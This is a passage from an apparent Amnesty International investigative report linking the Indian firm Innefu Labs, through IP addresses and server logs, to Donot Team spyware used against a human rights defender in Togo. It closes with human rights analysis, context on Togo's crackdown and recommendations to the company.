address\n122.160.158.3 since late 2016. Public domain registration records indicate this domain is owned by a Delhibased company named Innefu Labs.\n\n###### 4.5 LINKS BETWEEN INNEFU LABS IP ADDRESS AND ANDROID ATTACK INFRASTRUCTURE\n\nAmnesty International initially found the Innefu Labs IP address, 122.160.158.3, exposed in Android\nscreenshots on the Android spyware test server. While this IP address is not registered directly to Innefu\nLabs, it is being used by the company. A subdomain for authshieldserver.com has pointed to the Innefu\nLabs IP address since 2016. AuthShield is an Innefu Labs product. Additionally, the PassiveTotal service has\nalso recorded TLS certificates containing the innefu.com domain on the same IP address.\n\nOther IP addresses in the same IP range have publicly exposed web interfaces referencing Innefu Labs. One\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nsuch web service at neighbouring IP address 122.160.158.4 is titled “Intelligence Collation and Analysis\nSystem”. The page states that the service is “Powered by Innefu Labs”.\n\nThe same Innefu Labs IP address also appeared in the SQL databases Amnesty International discovered on\nthe URL shortener and Android spyware distribution servers. These SQL databases also contain records from\nprevious spyware distribution servers which were no longer active at the time of discovery.\n\nFile ID Timestamp        IP Address     User-Agent\n\n148 2018-10-17 12:59:08 122.160.158.3\n\n218 2018-11-09 05:16:37 122.160.158.3\n\n219 2018-11-09 05:18:08 122.160.158.3\n\n222 2018-11-09 07:29:19 122.160.158.3\n\n244 2018-11-15 12:17:41 122.160.158.3\n\n244 2018-11-15 12:17:46 122.160.158.3\n\n500 2019-02-16 10:48:59 122.160.158.3 WhatsApp/2.19.34 A\n\n519 2019-02-21 11:56:05 122.160.158.3 WhatsApp/2.19.34 A\n\n529 2019-02-26 06:50:29 122.160.158.3 WhatsApp/2.19.34 A\n\n532 2019-02-26 06:50:33 122.160.158.3 WhatsApp/2.19.34 A\n\n532 2019-02-26 06:53:23 122.160.158.3 Mozilla/5.0 (Linux; U; Android 7.1.2; en-gb; Redmi 5A Build/N2G47H)\nAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36\nXiaoMi/MiuiBrowser/10.4.3-g\n\n532 2019-02-26 06:55:22 122.160.158.3 Mozilla/5.0 (Linux; U; Android 7.1.2; en-gb; Redmi 5A Build/N2G47H)\nAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36\nXiaoMi/MiuiBrowser/10.4.3-g\n\n533 2019-02-26 06:56:24 122.160.158.3 WhatsApp/2.19.34 A\n\nFrom the table above we can see that the Innefu Labs IP, 122.160.158.3 downloaded 10 unique files from\nthe APK distribution server over a period of four months in late 2018 and early 2019. Two of those requests\nwere made on 26 February 2019 from a phone with a Xiaomi Redmi 5A User-Agent string. The User-Agent\nstring includes the exact version number of the phone and the web browser and therefore is quite distinctive.\n\nThis same User-Agent can also be seen in the logs on one other date, one week earlier on 19 February\n2019. This time, the request was from the IP address 193.169.244.74 which is assigned to the Ukrainian\nhosting provider Deltahost.\n\nFile ID Timestamp         IP Address       User-Agent\n\n510 2019-02-19 11:11:11 193.169.244.74 Mozilla/5.0 Linux; U; Android 7.1.2; en-gb; Redmi 5A Build/N2G47H)\nAppleWebKit/537.36 KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36\nXiaoMi/MiuiBrowser/10.4.3-g\n\n510 2019-02-19 11:11:14 193.169.244.74 Mozilla/5.0 Linux; U; Android 7.1.2; en-gb; Redmi 5A Build/N2G47H)\nAppleWebKit/537.36 KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36\nXiaoMi/MiuiBrowser/10.4.3-g\n\n532 2019-02-26 06:53:23 122.160.158.3  Mozilla/5.0 Linux; U; Android 7.1.2; en-gb; Redmi 5A Build/N2G47H)\nAppleWebKit/537.36 KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36\nXiaoMi/MiuiBrowser/10.4.3-g\n\n532 2019-02-26 06:55:22 122.160.158.3  Mozilla/5.0 Linux; U; Android 7.1.2; en-gb; Redmi 5A Build/N2G47H)\nAppleWebKit/537.36 KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36\nXiaoMi/MiuiBrowser/10.4.3-g\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nThis Deltahost VPS IP is recorded in the SQL database as the upload IP for 357 malicious and test APK files\nbetween September 2018 and March 2019. This suggests that the Deltahost IP is a proxy or VPN server that\nthe attackers use to obfuscate their location when interacting with the attack infrastructure.\n\nOn some occasions the attackers failed to use the Deltahost proxy or VPN, resulting in their unshielded IP\naddress being recorded in their server logs.\n\n###### 4.6 LINKS BETWEEN INNEFU LABS AND THE SPYWARE ATTACK IN TOGO\n\nWhile the precise nature of Innefu Labs’ connection to the attacks in Togo cannot be known, our\ninvestigation indicates that Innefu Labs at a minimum may have failed to prevent abuses linked to its\noperations and products and may have caused or contributed to these abuses.\n\nAmnesty International wrote to Innefu Labs in September 2020 to seek their response on the information\ndetailed in this report. In a letter in response to Amnesty International, Innefu Labs stated that it “has not\nsold any digital surveillance tools or any other services at all to the Government of Togo or any of its\nagencies. Innefu has never provided any digital surveillance tools or services for the purpose of conducting\nsurveillance of activists and human rights defenders.”[12]\n\nHowever, Innefu Labs and its IP address 122.160.158.3 (the Innefu Labs IP) was identified on multiple\nservers tied to Donot Team and the attacks against the HRD in Togo.\n\nThe WhatsApp screenshot shows that an attacker involved in testing the Donot Team Android spyware had\npreviously entered both the Innefu Labs IP address and the bulk.fun domain on their Android keyboard. This\nattacker was interacting directly with both the domain used in the Togo attacks and Innefu Labs’ own\nnetwork. This is significant as it shows that the Innefu Labs IP address is not only linked with testing Donot\nTeam spyware but also linked to the operational infrastructure used to deploy the Donot Team spyware.\n\nSeparately, the server logs found on the bulk.fun spyware server show that the Innefu Labs IP address had\nbeen connecting to Donot Team attack infrastructure for almost a year before the Togo spyware attacks. In\nFebruary 2019 the Xiaomi Redmi 5A phone was recorded in the logs connecting from both the Innefu IP\naddress and the Deltahost server at 193.169.244.74.\n\nThe database records indicate that the Deltahost server was being used as a private VPN or proxy in an\nattempt to obscure the location of the attackers. Indeed, the previous WhatsApp screenshot found exposed\non the spyware server shows that the Donot Team attackers have been using the OpenVPN software to\nobscure connections from their test mobile devices.\n\nOnly the group responsible for these attacks would have the credentials necessary to upload Android\nspyware to the attack server and to use the private VPN server. Connections by the same device from both\nthe Innefu Labs IP address and the private VPN server indicate that the same threat actor had access to\nboth Innefu Labs’ internal network and Donot Team’s attack infrastructure. Taken as a whole, this evidence\nstrongly suggests that Innefu Labs is linked to the development of Donot Team spyware and is connected to\nat least some of Donot Team’s attack infrastructure.\n\nInnefu Labs may not be actively involved in attacks attributed to Donot Team. However, in this case, there is\nevidence linking Innefu Labs to the Donot Team infrastructure used in these attacks.\n\nThe appearance of the Innefu Labs IP address separately on both the bulk.fun attack server logs, and again\nside-by-side with the bulk.fun domain in test spyware screenshots show that Innefu Labs have a connection\nto the bulk.fun server used in the attacks against the HRD in Togo.\n\n12 Innefu Labs letter to Amnesty International, 30 October 2020, see Annex 1. (Innefu Labs, October 2020).\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n###### 4.7 WHO IS INNEFU LABS?\n\nOn its website Innefu Labs Pvt. Ltd. describes itself as an “Information Security R&D start-up, providing\ncutting-edge Information Security & Data Analytics solutions”. It claims its customers include “some of the\nmost sensitive and critical organizations in Government of India”. The company states that “Innefu is an AIdriven R&D start-up, providing information security and AI-based Predictive Analytics and Big Data analytics\nsolutions to our clients that does include law enforcement agencies.”[13]\n\nOn its website the company describes developing cyber intelligence solutions for Law Enforcement and\nDefence including social media monitoring, facial recognition systems, and predictive policing systems. One\nof its listed products is the AuthShield Two-Factor authentication solution linked to the domain\nauthshieldserver.com and the Innefu Labs IP address 122.160.158.3 previously mentioned in section 4.4.\n\nThe company does not seem to publicly advertise offensive cyberattack services. However, in addition to the\nlinks between Innefu Labs and the Donot Team attack infrastructure, there is supporting evidence\ndemonstrating that the company may be engaged in cybersurveillance activities.\n\nInnefu Labs’ website presents reports which showcase their Prophecy Innsight social media monitoring tool.\nThese reports focus on a range of social and political movements in India and abroad including “Unravelling\nSudan Uprisings: Open source intelligence on the ongoing anti-government protests in Sudan”, and an open\nsource intelligence (OSINT) report “Influencers opposing Article 370 - Shehla Rashid & co”.Amnesty\nInternational reviewed public LinkedIn profiles for current and former Innefu Labs employees. A software\ndeveloper who worked for Innefu Labs from June 2018 to August 2019 claimed that he developed software\nin C++, the language used to create the Donot YTY spyware. The description, including “prevent them from\n_reverse engineering”, “research work on anti-viruses\" and “[improving] the algorithm for fast gathering of_\n_data”, shows that he worked on anti-detection and data-gathering techniques that are very specific to_\nspyware development.\n\n13 Innefu Labs, previously cited, October 2020\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nAnother former employee’s public Curriculum Vitae includes explicit claims of developing spyware at Innefu\nLabs as early as December 2010.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n## 5. HUMAN RIGHTS\n CONCERNS\n\n###### 5.1 HUMAN RIGHTS CONCERNS AND INNEFU LABS’ RESPONSIBILITIES\n\nAmnesty International wrote to Innefu Labs in September 2020 to seek their response on a number of\nquestions raised in this investigation. Amnesty International wrote a further letter to the company on 20\nSeptember 2021 seeking comment ahead of publication of this report. The full response from Innefu Labs is\nincluded in Appendix I, wherein they deny any knowledge of “Donot Team” and deny exporting digital\nsurveillance tools or services to any country, including to authorities in Togo.\n\nHowever, Amnesty International’s investigation uncovered evidence demonstrating apparent links between\nInnefu Labs and the Donot Team spyware and attack infrastructure, including the infrastructure used in the\nunlawful targeting of the Togolese HRD. There is no suggestion that this prominent HRD has been a suspect\nor investigated for any crime. Their targeting is likely for their legitimate human rights work.\n\nThe technical evidence suggests that Innefu Labs is linked to development and/or deployment of some\nDonot Team spyware tools. These tools may be shared by a range of hacker-for-hire actors which are\ngrouped under the “Donot Team” cluster. There is no technical evidence to suggest Innefu Labs was directly\nresponsible for or aware of the attacks against the HRD in Togo using the Donot Team spyware tools.\n\nHowever, the development or supply of technology such as spyware can create serious human rights risks.\nAt a minimum, Innefu Labs has a responsibility to ensure that any technology or services developed by the\ncompany do not contribute to human rights abuses.\n\nThe UN Guiding Principles on Business and Human Rights state that, to meet their responsibility to respect\nhuman rights, businesses should have in place human rights policy commitments and address adverse\nhuman rights impacts with which they are involved through human rights due diligence.[14] Due diligence is a\nprocess of identifying and assessing; ceasing, mitigating and preventing; tracking and monitoring;\ncommunicating and accounting for human rights risks and impacts.\n\nIn their letter, Innefu Labs stated that they do not have a human rights policy. Amnesty International also\nasked whether Innefu Labs has a process for carrying out human rights due diligence, but the company did\nnot provide any information.\n\nThe fact that Innefu Labs lacks a human rights policy and does not appear to carry out human rights due\ndiligence is especially concerning not only given the evidence set out in this report but given the suite of\nproducts and services it offers, all of which pose an enormous risk to human rights. The company describes\ndeveloping cyber intelligence solutions for law enforcement and defence including social media monitoring,\nfacial recognition systems, and predictive policing systems, all technologies with the potential to undermine\nhuman rights.\n\n14 Office of the UN High Commissioner for Human Rights (OHCHR), Guiding Principles on Business and Human Rights: Implementing the\n_United Nations “Protect, Respect and Remedy” Framework, 2011 (UN Guiding Principles)._\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nAccording to media reports, Innefu Labs’ facial recognition system has been deployed during the protests\nagainst the discriminatory Citizenship Amendment Act Delhi in 2019.[15] The use of facial recognition to\nclamp down on protests violates the right to expression, association, and peaceful assembly. When used for\nidentification purposes, facial recognition systems are fundamentally incompatible with human rights.\nAmnesty International calls for a ban on the use, development, production, sale, and export of facial\nrecognition technology for identification purposes by both state agencies and private sector actors.[16]\n\nSimilarly, predictive policing systems are known to have adverse human rights impacts and violate the rights\nto privacy and non-discrimination amongst others.[17]\n\nThere is an urgent need for Innefu Labs to adopt a robust human rights policy, conduct adequate due\ndiligence, and ensure transparency and processes to enable the remediation of any adverse human rights\nimpacts they cause or to which they contribute.\n\n###### 5.2 CYBER MERCENARIES ON THE RISE\n\nA growing list of companies and groups have been linked to offensive cyber activities targeting HRDs and\ncivil society. In many of these cases the companies appear to play a direct role in the attacks, including\ndeploying spyware and performing social engineering against the targets.\n\nThe worrying trend of private companies actively performing unlawful digital surveillance increases the scope\nfor abuse while reducing avenues for domestic legal redress, regulation, and judicial control.\n\nThe nature of cross-border commercial cybersurveillance where the surveillance targets, the operators, the\nend customer, and the attack infrastructure can all be located in different jurisdictions creates significant\nimpediments to achieving remediation and redress for human rights abuses.\n\nIt further leaves any HRD, anywhere in the world, open to potential unlawful targeted surveillance, leaving no\nsafe refuge. This particularly increases the threat of extraterritorial surveillance against diaspora activists.\n\nIn 2017, Amnesty International first revealed the “Operation Kingphish” surveillance campaign targeting\nmigrant rights activists and journalists based in Qatar and Nepal.[18] Subsequent research published by\nBellingcat found links between the Operation Kingphish attacks and a larger set of activity tied to a hackerfor-hire group known as Bahamut.[19]\n\nBlackberry Research released a significant report in late 2020 which also attributes multiple long running\nspyware, social engineering and disinformation campaigns targeting Kashmiri and Sikh activist groups,\nbusiness and diplomatic targets in South Asia and the Gulf states to Bahamut.[20] The range of targeting again\nsuggests that Bahamut is a hacker-for-hire actor performing surveillance of civil society on behalf of multiple\ncustomers.\n\nIn 2020, Citizen Lab published a detailed investigation exposing an extensive campaign of targeted\nsurveillance which it named “Dark Basin”.[21] Its three-year investigation outlines attacks against a wide range\nof civil society, media and business targets globally. Technical evidence allowed Citizen Lab to attribute the\nattacks to another Indian cybersecurity company named BellTroX.\n\nSignificantly, Citizen Lab researchers documented an extensive set of attacks targeting civil society and\n[environmental activists in the United States. Many of these activists were members of the #ExxonKnew](https://exxonknew.org/)\n\n15 Alexandra Ulmer and Zeba Siddiqui, “India's use of facial recognition tech during protests causes stir”, Reuters, 17 February 2020,\n[reuters.com/article/us-india-citizenship-protests-technology-idUSKBN20B0ZQ.](http://www.reuters.com/article/us-india-citizenship-protests-technology-idUSKBN20B0ZQ)\n\n16 Amnesty International, “Amnesty International Calls for Ban on the Use of Facial Recognition Technology for Mass Surveillance”, 11 June\n[2020, amnesty.org/en/latest/research/2020/06/amnesty-international-calls-for-ban-on-the-use-of-facial-recognition-technology-for-mass-](http://www.amnesty.org/en/latest/research/2020/06/amnesty-international-calls-for-ban-on-the-use-of-facial-recognition-technology-for-mass-surveillance/)\n[surveillance.](http://www.amnesty.org/en/latest/research/2020/06/amnesty-international-calls-for-ban-on-the-use-of-facial-recognition-technology-for-mass-surveillance/)\n\n17 Amnesty International, We sense trouble: Automated discrimination and mass surveillance in predictive policing in the Netherlands\n[(Index: EUR 35/2971/2020), 29 September 2020, amnesty.org/en/documents/eur35/2971/2020/en.](https://www.amnesty.org/en/documents/eur35/2971/2020/en/)\n\n18 Amnesty International, Operation Kingphish: Uncovering a Campaign of Cyber Attacks against Civil Society in Qatar and Nepal, 14\n[February 2017, medium.com/amnesty-insights/operation-kingphish-uncovering-a-campaign-of-cyber-attacks-against-civil-society-in-qatar-](https://medium.com/amnesty-insights/operation-kingphish-uncovering-a-campaign-of-cyber-attacks-against-civil-society-in-qatar-and-aa40c9e08852)\n[and-aa40c9e08852.](https://medium.com/amnesty-insights/operation-kingphish-uncovering-a-campaign-of-cyber-attacks-against-civil-society-in-qatar-and-aa40c9e08852)\n\n19 Colin Anderson, “Bahamut, Pursuing a Cyber Espionage Actor in the Middle East”, Bellingcat, 12 June 2017,\n[bellingcat.com/news/mena/2017/06/12/bahamut-pursuing-cyber-espionage-actor-middle-east.](http://www.bellingcat.com/news/mena/2017/06/12/bahamut-pursuing-cyber-espionage-actor-middle-east/)\n\n20 Blackberry Research, BAHAMUT: Hack-for-Hire Masters of Phishing, Fake News, and Fake Apps, October 2020.\n[blackberry.com/us/en/pdfviewer?file=/content/dam/blackberry-com/asset/enterprise/pdf/direct/report-spark-bahamut.pdf.](http://www.blackberry.com/us/en/pdfviewer?file=/content/dam/blackberry-com/asset/enterprise/pdf/direct/report-spark-bahamut.pdf)\n\n21 John Scott-Railton and others, “Dark Basin: Uncovering a Massive Hack-For-Hire Operation”, Citizen Lab, 9 June 2020,\n_[citizenlab.ca/2020/06/dark-basin-uncovering-a-massive-hack-for-hire-operation.](https://citizenlab.ca/2020/06/dark-basin-uncovering-a-massive-hack-for-hire-operation/)_\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\ncampaign, which aimed to prove that ExxonMobil concealed information about climate change for\ndecades.[22]\n\nThe scope and persistent nature of these attacks show that nobody is safe from the expanding private\nsurveillance industry.\n\nIn July 2020, The UN ‘Working Group on the use of mercenaries as a means of violating human rights and\nimpeding the exercise of the right of peoples to self-determination’ specifically highlighted the threat posed\nby cyber mercenaries in its report.[23 ]\n\nThat companies like Innefu Labs and BellTroX are operating in India without adequate regulation is a serious\nconcern for human rights. India is part of the Wassenaar Arrangement – a voluntary export control regime\nwhose 42 member states exchange information on transfers of conventional weapons and dual-use goods\nand technologies – through which India commits to putting in place export controls for targeted surveillance\ntechnologies. India has human rights obligations to rein in abuses by such companies, including through\nadequate regulation and oversight. Further, the United Nations Guiding Principles on Business and Human\nRights require states to set out clearly the expectation that all business enterprises domiciled in their territory\nand/or jurisdiction respect human rights throughout their operations.\n\n###### 5.3 CIVIL SOCIETY UNDER SURVEILLANCE IN TOGO\n\nSeveral religious and opposition political figures in Togo have reportedly been targeted with digital\nsurveillance tools. In August 2020, The Guardian and Citizen Lab revealed that two Catholic clergy members,\nBishop Benoît Alowonou and Father Pierre Chanel Affognon had been targeted using a NSO Group-linked[24]\nWhatsApp vulnerability.[25] Both were notified by WhatsApp following the attacks in April and May 2019.\n\n[In the same period two members of the political opposition in Togo were also targeted using NSO Group](https://citizenlab.ca/2020/08/nothing-sacred-nso-sypware-in-togo/)\n[tools.[26] The Pegasus Project revealed that hundreds of Togolese numbers were listed as potential targets of](https://citizenlab.ca/2020/08/nothing-sacred-nso-sypware-in-togo/)\nNSO Group’s Pegasus spyware.[27] Those on the list included independent journalists and members of\npolitical opposition groups.[28]\n\nWhile the campaigns described in this report have no known links to NSO Group, they are part of a pattern\nof digital threats faced by HRDs and dissenting voices in Togo.\n\n###### 5.4 SHRINKING SPACE FOR HUMAN RIGHTS WORK IN TOGO \n\n “These attacks were crippling to work, especially since I didn’t know the full extent of what was going on. I didn’t know which electronic devices were safe or have means to be sure my communications with my colleagues and victims were\n\n22 John Scott-Railton and others, previously cited, 9 June 2020.\n\n23 UN General Assembly, Report of the Working Group on the use of mercenaries as a means of violating human rights and impeding the\n_exercise of the right of peoples to self-determination, 28 July 2020, UN Doc. A/75/259._\n\n24 NSO Group is an Israeli cyber surveillance company. Its products have been linked to unlawful surveillance against journalist and HRDs\nin many countries including the UAE, Mexico, India, Morocco, Rwanda, and Togo.\n\n25 Stephanie Kirchgaessner and Jennifer Rankin, “WhatsApp spyware attack: senior clergymen in Togo among activists targeted”, The\n_[Guardian, 3 August 2020, theguardian.com/technology/2020/aug/03/senior-clergymen-among-activists-targeted-by-spyware.](http://www.theguardian.com/technology/2020/aug/03/senior-clergymen-among-activists-targeted-by-spyware)_\n\n26 John Scott-Railton and others, “Nothing Sacred: Religious and Secular Voices for Reform in Togo Targeted with NSO Spyware”, Citizen\n[Lab, 3 August 2020, citizenlab.ca/2020/08/nothing-sacred-nso-sypware-in-togo.](https://citizenlab.ca/2020/08/nothing-sacred-nso-sypware-in-togo/)\n\n[27 RFI, “Au Togo, plus de 300 numéros de téléphone ciblés par Pegasus”, 24 July 2021, rfi.fr/fr/afrique/20210724-au-togo-plus-de-300-](http://www.rfi.fr/fr/afrique/20210724-au-togo-plus-de-300-num%C3%A9ros-de-t%C3%A9l%C3%A9phone-cibl%C3%A9s-par-pegasus)\n[num%C3%A9ros-de-t%C3%A9l%C3%A9phone-cibl%C3%A9s-par-pegasus.](http://www.rfi.fr/fr/afrique/20210724-au-togo-plus-de-300-num%C3%A9ros-de-t%C3%A9l%C3%A9phone-cibl%C3%A9s-par-pegasus)\n\n28 Christophe Châtelot, “Au Togo, les opposants au président Gnassingbé surveillés comme des criminels”, Le Monde, 28 July 2021,\n[lemonde.fr/projet-pegasus/article/2021/07/23/projet-pegasus-au-togo-les-opposants-au-president-gnassingbe-surveilles-comme-des-](http://www.lemonde.fr/projet-pegasus/article/2021/07/23/projet-pegasus-au-togo-les-opposants-au-president-gnassingbe-surveilles-comme-des-criminels_6089310_6088648.html)\n[criminels_6089310_6088648.html.](http://www.lemonde.fr/projet-pegasus/article/2021/07/23/projet-pegasus-au-togo-les-opposants-au-president-gnassingbe-surveilles-comme-des-criminels_6089310_6088648.html)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n###### secure. Not knowing how far the intrusions could have affected my personal data, I was in a confused and helpless situation.”\n\nTogo-based human rights defender who was targeted by this surveillance campaign.\n\nThe targeted digital attack campaign against the prominent HRD in Togo occurred in the context of a\nbroader insecure environment for government critics.\n\nIn 2019, the year preceding the presidential election, Amnesty International documented the adoption of\nlaws curtailing the rights to freedom of expression and peaceful assembly and cases of human rights\nviolations committed by the authorities, particularly against pro-democracy activists.[29 ]\n\nNotably, on 12 August 2019, the National Assembly adopted two laws raising major human rights concerns.\nThe homeland security law detailed measures that are applicable during “threats or grave breaches of public\norder”.[30] It allows the Minister of Territorial Administration and, in some cases, local authorities to order\nhouse arrests, identity controls and interrogations of up to 24 hours, expulsions of foreign nationals, bans on\nassemblies, suspensions of associations, and closures of establishments including places of worship, hotels\nand “other meeting places” without proper judicial oversight.[31]\n\nThe law allows the Minister of Territorial Administration wide discretion to censor online content and shut\ndown the Internet. Moreover, revisions to the law on assemblies stated that organizers of meetings and\nassemblies in private settings must inform local authorities in advance. It provides for a ban on assemblies in\ncertain locations and at certain times. The law allows local authorities to cap the number of assemblies per\nweek in their area and to ban protests at the last minute.[32]\n\nIn December 2018, the National Assembly passed the law on cybersecurity and the fight against cyber\ncriminality that severely restricts the right to freedom of expression by introducing punishments up to three\nyears’ imprisonment for false information, and up to two years’ imprisonment for attacks on public morality,\nas well as the production, dissemination or sharing of data that undermines “order, public security or human\ndignity”.[33]\n\nIn addition, the law contains vague provisions on terrorism and treason, that carry penalties of up to 20\nyears, and could be easily used against whistle-blowers and others reporting human rights violations and\nabuses. It also confers additional powers on the police, in terms of surveillance of communications or IT\nequipment, without adequate safeguards including judicial control.\n\nAmnesty International has also called on Togo authorities to protect human rights defenders. In April 2020,\ntwo human rights defenders and a journalist were arrested and detained during human rights monitoring.\nTheir mobile phones were also confiscated by an officer of Service Central de Recherches et d’Investigations\nCriminelles (SCRIC).[34]\n\nOn 19 January 2019, the Criminal Court of Lomé sentenced activist Foly Satchivi of the movement Under No\nCircumstances (En aucun cas) to 36 months in prison, with a 12-month suspended sentence, for\n“rebellion”, “apology of crimes and offences” and “aggravated public disorder”.[35]\n\n29 Amnesty International, Human rights in Africa: Review of 2019 (Index: AFR 01/1352/2020), 8 April 2020,\n[amnesty.org/en/documents/afr01/1352/2020/en,](https://www.amnesty.org/en/documents/afr01/1352/2020/en/)\n\n30 Loi n° 2019-009 du 12/08/2019 relative à la sécurité intérieure.\n\n31 Amnesty International, Human rights in Africa: Review of 2019 (Index: AFR 01/1352/2020), 8 April 2020,\n[amnesty.org/en/documents/afr01/1352/2020/en,](https://www.amnesty.org/en/documents/afr01/1352/2020/en/)\n\n32 Loi N°2019-010 du 12 aout 2019 portant modification de la loi N°2011-010 du 16 mai 2011 fixant les conditions d’exercice de la liberté\n\nde réunion et de manifestation pacifiques publiques.\n\n33 Loi n° 2018 – 026 du 07/12/18 sur la cybersécurité et la lutte contre la cybercriminalité.\n\n34 Amnesty international, Togo: Submission to the United Nations Human Rights Committee, 128th session, 2 March- 27 March 2020\n[(Index: AFR 57/1653/2020), 3 February 2020, amnesty.org/es/documents/afr57/1653/2020/en.](https://www.amnesty.org/es/documents/afr57/1653/2020/en/)\n35 Amnesty international, Togo: Submission to the United Nations Human Rights Committee, 128th session, 2 March- 27 March 2020\n[(Index: AFR 57/1653/2020), 3 February 2020, amnesty.org/es/documents/afr57/1653/2020/en.](https://www.amnesty.org/es/documents/afr57/1653/2020/en/)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nHe had been arrested on 22 August 2018 while he was about to hold a press conference on the crackdown\non protests. On 10 October 2019, the Court of Appeal reduced his sentence to 28 months in prison, with a\nsix-month suspended sentence. He was released on 16 October 2019 following a presidential pardon.[36]\n\nOn 15 October 2019, pro-democracy activists from Turn the Page Niger (Tournons la page Niger, TLP Niger)\nand TLP Côte d’Ivoire were denied access to Togo.[37]\n\nIn August 2020, Citizen Lab identified four Togolese religious and political opposition figures who were\ntargeted with the Pegasus spyware sold by NSO Group. All of these individuals were targeted using a security\nvulnerability in WhatsApp in early 2019.[38] As outlined in Section 5.3, the Pegasus Project revealed that\nhundreds of Togolese phone numbers were contained in a list of possible targets of NSO Group’s Pegasus\nspyware, including journalists and opposition political figures.\n\nThe additional attempted digital attacks identified in this report and directed against a human rights\ndefender in Togo highlight yet another threat faced by human rights defenders in Togo. Togolese authorities\nhave a responsibility to respect the right to freedom of expression, including from violations against the right\nto privacy. They also have the obligation to protect from violations from third parties. Togolese authorities\nshould put in stronger mechanisms to ensure that HRDs are able to carry out their work in a safe and\nenabling environment, including providing protection against and remedy for unlawful targeted surveillance.\n\nAmnesty International wrote to the Minister for Human Rights and Relations with the Institutions of Togo to\nrequest a response to our findings but did not received a response at the time of publication.\n\n36 Amnesty international, Togo: Submission to the United Nations Human Rights Committee, 128th session, 2 March- 27 March 2020\n[(Index: AFR 57/1653/2020), 3 February 2020, amnesty.org/es/documents/afr57/1653/2020/en.](https://www.amnesty.org/es/documents/afr57/1653/2020/en/)\n\n37 Amnesty international, Togo: Submission to the United Nations Human Rights Committee, 128th session, 2 March- 27 March 2020\n[(Index: AFR 57/1653/2020), 3 February 2020, amnesty.org/es/documents/afr57/1653/2020/en.](https://www.amnesty.org/es/documents/afr57/1653/2020/en/)\n\n38 John Scott-Railton and others, “Nothing Sacred: Religious and Secular Voices for Reform in Togo Targeted with NSO Spyware”, Citizen\n[Lab, 3 August 2020, citizenlab.ca/2020/08/nothing-sacred-nso-sypware-in-togo.](https://citizenlab.ca/2020/08/nothing-sacred-nso-sypware-in-togo/)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n## 6. CONCLUSION AND\n RECOMMENDATIONS\n\nAs mentioned previously, evidence in this report shows that Donot Team spyware was used in the digital\nattacks against the prominent Togolese HRD. The targeting of the same HRD via both WhatsApp and email\nsuggests that they were the clear and intended target of the attacks. Multiple distinct actors or organizations\nmay have access to the custom Donot Team spyware toolset. The identity of all individuals or groups\ninvolved in Donot Team attacks is unknown. Based on the evidence collected in this research Amnesty\nInternational believes that Innefu Labs plays a role in the development and/or deployment of some of the\nspyware tools which have been previously linked to Donot Team.\n\nAmnesty International’s investigation has found direct links between Innefu Labs, the Innefu Labs IP address\nand the server at bulk.fun which was used to send the Donot Team spyware to the HRD. The Innefu Labs IP\naddress 122.160.158.3 was included in the exposed log files on the bulk.fun attack server. Additionally, the\nsame Innefu Labs IP address was recorded in an Android screenshot beside the bulk.fun domain when the\nattackers were testing their spyware.\n\nThe research does not exclude the possibility that other actors were also involved in the targeting of this\nHRD. However, it is clear that Innefu Labs is linked to the development and/or deployment of Donot Team\nspyware tools, and has connections to the attack infrastructure used to this attack.\n\nAs such, there is a clear risk that Innefu Labs may have contributed to human rights abuses in this case.\n\n###### 6.1 RECOMMENDATIONS\n\n TO INNEFU LABS\n\n  - Conduct an external audit and publish in full the findings of the audit into Innefu Labs links to the\nspyware infrastructure and tools used in the attack against the HRD from Togo, including detailing\nthe actions taken by Innefu Labs in response to the audit.\n\n  - Urgently adopt a human rights policy and ensure contractual protections against human rights\nabuse.\n\n  - Adhere to the UNGPs and the Organization for Economic Cooperation and Development (OECD)\nGuidelines.\n\n  - Urgently ensure transparency with regard to sales and contracts of all its technologies.\n\n  - Conduct adequate human rights due diligence, the results of which should be disclosed, to identify,\nprevent, mitigate, and address any adverse human rights impacts which Innefu Labs may cause,\ncontribute to, or be directly linked to.\n\n  - Conduct consultations with rights holders domestically or in destination countries before signing\ncontracts to identify and assess human rights risks and develop mitigation measures.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n  - Have an adequate notification process for reporting misuse of technology and grievance mechanisms\nand implement robust mechanisms for compensation or other forms of redress for victims of unlawful\nsurveillance.\n\n  - Cease the development, production, sale, and export of facial recognition technologies for\nidentification purposes, which are fundamentally incompatible with human rights.\n\n  - Terminate or suspend any contracts with government entities domestically or globally who may have\nused its tools to carry out unlawful 